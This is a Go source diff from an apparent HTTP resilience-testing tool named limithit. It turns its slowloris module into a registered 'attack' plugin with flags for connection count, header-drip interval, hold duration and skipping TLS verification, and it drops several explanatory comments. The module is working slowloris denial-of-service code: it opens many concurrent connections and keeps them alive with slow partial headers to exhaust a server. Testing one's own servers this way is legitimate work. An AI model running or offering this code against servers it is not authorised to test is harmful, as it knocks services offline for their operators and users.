@@ -4,6 +4,7 @@ import (
 	"context"
 	"crypto/tls"
 	"errors"
+	"flag"
 	"fmt"
 	"math/rand/v2"
 	"net"
@@ -11,10 +12,58 @@ import (
 	"sync"
 	"time"
 
+	"github.com/conantorreswf/limithit/internal/attacks"
 	"github.com/conantorreswf/limithit/internal/metrics"
 )
 
-type Options struct {
+func init() {
+	attacks.Register("slowloris", func() attacks.Attack { return &Slowloris{} })
+}
+
+type Slowloris struct {
+	connections    int
+	headerInterval int
+	hold           int
+	dialTimeout    int
+	insecure       bool
+}
+
+func (s *Slowloris) Name() string     { return "slowloris" }
+func (s *Slowloris) Synopsis() string { return "hold many connections open with slow header drip" }
+
+func (s *Slowloris) Flags(fs *flag.FlagSet) {
+	fs.IntVar(&s.connections, "connections", 200, "concurrent open connections")
+	fs.IntVar(&s.headerInterval, "header-interval", 10, "seconds between drip headers")
+	fs.IntVar(&s.hold, "hold", 120, "total hold duration per connection (seconds)")
+	fs.IntVar(&s.dialTimeout, "dial-timeout", 5, "dial timeout seconds")
+	fs.BoolVar(&s.insecure, "insecure", false, "skip TLS verification")
+}
+
+func (s *Slowloris) Validate() error {
+	if s.connections < 1 {
+		return errors.New("connections must be >= 1")
+	}
+	return nil
+}
+
+func (s *Slowloris) Run(ctx context.Context, base attacks.Base) (attacks.Report, error) {
+	opts := options{
+		URL:             base.URL,
+		Connections:     s.connections,
+		HeaderInterval:  time.Duration(s.headerInterval) * time.Second,
+		Hold:            time.Duration(s.hold) * time.Second,
+		DialTimeout:     time.Duration(s.dialTimeout) * time.Second,
+		WriteTimeout:    5 * time.Second,
+		InsecureSkipTLS: s.insecure,
+	}
+	rep, err := run(ctx, opts)
+	if err != nil {
+		return nil, err
+	}
+	return rep, nil
+}
+
+type options struct {
 	URL             string
 	Connections     int
 	HeaderInterval  time.Duration
@@ -24,7 +73,7 @@ type Options struct {
 	InsecureSkipTLS bool
 }
 
-func Run(ctx context.Context, opts Options) (*metrics.ConnReport, error) {
+func run(ctx context.Context, opts options) (*metrics.ConnReport, error) {
 	if opts.Connections < 1 {
 		opts.Connections = 1
 	}
@@ -72,7 +121,6 @@ func Run(ctx context.Context, opts Options) (*metrics.ConnReport, error) {
 			holdOne(ctx, id, host, path, u, opts, cc)
 		}(i)
 
-		// stagger slightly to avoid all dialing at once
 		select {
 		case <-ctx.Done():
 			break
@@ -83,7 +131,7 @@ func Run(ctx context.Context, opts Options) (*metrics.ConnReport, error) {
 	return cc.Finalize(time.Since(start)), nil
 }
 
-func holdOne(ctx context.Context, id int, host, path string, u *url.URL, opts Options, cc *metrics.ConnCollector) {
+func holdOne(ctx context.Context, _ int, host, path string, u *url.URL, opts options, cc *metrics.ConnCollector) {
 	cc.Attempt()
 
 	dialer := &net.Dialer{Timeout: opts.DialTimeout}
@@ -141,9 +189,6 @@ func holdOne(ctx context.Context, id int, host, path string, u *url.URL, opts Op
 				cc.Error("drip-write:" + classifyErr(err))
 				return
 			}
-			// peek for server close: tiny read with short deadline. If we
-			// get EOF or any data (e.g. 408/400 response) the server has
-			// stopped tolerating us.
 			_ = conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
 			var probe [1]byte
 			if _, rerr := conn.Read(probe[:]); rerr != nil {
@@ -156,7 +201,6 @@ func holdOne(ctx context.Context, id int, host, path string, u *url.URL, opts Op
 					return
 				}
 			} else {
-				// server actually sent us something — likely the response
 				cc.DroppedByServer(time.Since(openedAt))
 				cc.Error("drip-resp")
 				return
